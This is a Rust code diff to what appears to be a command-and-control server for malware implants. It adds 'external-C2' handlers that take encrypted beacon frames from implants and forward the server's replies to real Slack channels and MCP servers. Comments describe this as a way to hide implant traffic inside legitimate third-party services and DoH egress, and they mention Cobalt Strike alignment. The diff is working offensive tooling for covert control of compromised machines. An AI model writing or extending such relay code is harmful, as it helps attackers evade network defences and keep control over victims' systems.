@@ -7,6 +7,7 @@
 //! - `GET  /api/results`       — drain task results for a session (JSON).
 
 pub mod audit;
+pub mod extc2_relay;
 pub mod implant_gen;
 pub mod kernel;
 pub mod operators;
@@ -143,6 +144,14 @@ pub struct AppState {
     /// path is configured (test/dev mode: persistence is skipped, sessions are
     /// back to in-memory-only as before).
     pub sessions_db: Option<Arc<SessionPersistence>>,
+    /// External-C2 relay config (Slack/MCP/...). When a channel is configured
+    /// here, the corresponding `/extc2/<service>` route forwards the sealed
+    /// reply frame to the real third-party API via the `nyx-transport` crate's
+    /// channel impl — making the server an actual external-C2 relay rather
+    /// than just a URI alias for `/beacon`. `None` per channel = relay disabled
+    /// for that channel (the route still works as a plain beacon endpoint).
+    /// See `extc2_relay.rs`.
+    pub extc2: extc2_relay::ExtC2RelayConfig,
 }
 
 /// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
@@ -195,6 +204,7 @@ impl Default for AppState {
             implant_rate_limiter: DashMap::new(),
             implants: None,
             sessions_db: None,
+            extc2: extc2_relay::ExtC2RelayConfig::default(),
         }
     }
 }
@@ -704,9 +714,18 @@ pub fn router(state: Arc<AppState>) -> Router {
     // frame, so it funnels through the same `beacon` handler as `/beacon`.
     // External C2 endpoints (spec-6). The implant POSTs the raw encrypted frame
     // to `/extc2/<service>` instead of the real third-party API (Slack/Discord/
-    // LLM/MCP). In this simplified design the body IS the frame — identical to
-    // `/beacon` — so these routes reuse the beacon handler directly. The
-    // operator-facing relay to the actual provider happens out-of-band.
+    // LLM/MCP). The body IS the frame — identical to `/beacon` — so these routes
+    // run the same beacon handler to decrypt, queue results, and seal a reply.
+    //
+    // **Slack** and **MCP** routes go through [`extc2_relay_handler`], which
+    // additionally fans the sealed reply out to the real third-party API via
+    // the `nyx-transport` crate's `SlackTransport` / `McpTransport` (when the
+    // operator has configured `NYX_EXTC2_*`). That makes the server an actual
+    // external-C2 relay rather than just a URI alias for `/beacon`.
+    //
+    // **Discord** and **LLM** still delegate to the plain `beacon` handler
+    // pending their own relay wiring (see TODOs in `extc2_relay.rs`).
+    //
     // `/doh` is the DoH-channel beacon endpoint (spec-2). The DoH channel POSTs
     // the same encrypted frame as `/beacon` but to `/doh` (CS 4.11 DoH Beacon
     // alignment — blends with DoH egress by URI while reusing the full
@@ -715,10 +734,10 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/beacon", post(beacon))
         .route("/doh", post(beacon))
         .route("/dns", post(beacon))
-        .route("/extc2/slack", post(beacon))
+        .route("/extc2/slack", post(extc2_relay_handler_slack))
         .route("/extc2/discord", post(beacon))
         .route("/extc2/llm", post(beacon))
-        .route("/extc2/mcp", post(beacon));
+        .route("/extc2/mcp", post(extc2_relay_handler_mcp));
     let mut seen = std::collections::HashSet::new();
     for (uri, is_post) in extra {
         if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
@@ -792,6 +811,66 @@ async fn beacon(
         Ok(frame) => shape_beacon_response(&st, frame),
         Err(e) => {
             tracing::warn!(error = %e, "beacon handler error");
+            StatusCode::BAD_REQUEST.into_response()
+        }
+    }
+}
+
+/// External-C2 Slack relay handler.
+///
+/// Runs the normal beacon path (decrypt → queue results → seal reply) and then,
+/// **in addition**, forwards the sealed reply frame to the real Slack channel
+/// via [`nyx_transport::SlackTransport`] when the operator has configured
+/// `NYX_EXTC2_SLACK_TOKEN` + `NYX_EXTC2_SLACK_CHANNEL`. The relay is
+/// fire-and-forget: a Slack outage never fails the beacon reply, which is
+/// still returned to the implant over the local HTTP connection exactly as
+/// `/beacon` would have returned it.
+///
+/// When the Slack relay is unconfigured, this handler is functionally
+/// identical to [`beacon`] — preserving the legacy behaviour for operators
+/// who haven't stood up the Slack side yet.
+async fn extc2_relay_handler_slack(
+    State(st): State<Arc<AppState>>,
+    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
+    method: Method,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Response {
+    match handle_beacon(&st, &peer, &method, &headers, &body) {
+        Ok(frame) => {
+            // Fan out a COPY of the reply to Slack before shaping/responding.
+            // `Bytes::clone` is Arc-backed (cheap; no allocation).
+            if let Some(slack) = &st.extc2.slack {
+                extc2_relay::relay_reply_to_slack(slack, frame.clone());
+            }
+            shape_beacon_response(&st, frame)
+        }
+        Err(e) => {
+            tracing::warn!(error = %e, "extc2/slack beacon handler error");
+            StatusCode::BAD_REQUEST.into_response()
+        }
+    }
+}
+
+/// External-C2 MCP relay handler. Same shape as [`extc2_relay_handler_slack`]
+/// but forwards the reply to the configured MCP server via
+/// [`nyx_transport::McpTransport`] (`tools/call`).
+async fn extc2_relay_handler_mcp(
+    State(st): State<Arc<AppState>>,
+    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
+    method: Method,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Response {
+    match handle_beacon(&st, &peer, &method, &headers, &body) {
+        Ok(frame) => {
+            if let Some(mcp) = &st.extc2.mcp {
+                extc2_relay::relay_reply_to_mcp(mcp, frame.clone());
+            }
+            shape_beacon_response(&st, frame)
+        }
+        Err(e) => {
+            tracing::warn!(error = %e, "extc2/mcp beacon handler error");
             StatusCode::BAD_REQUEST.into_response()
         }
     }
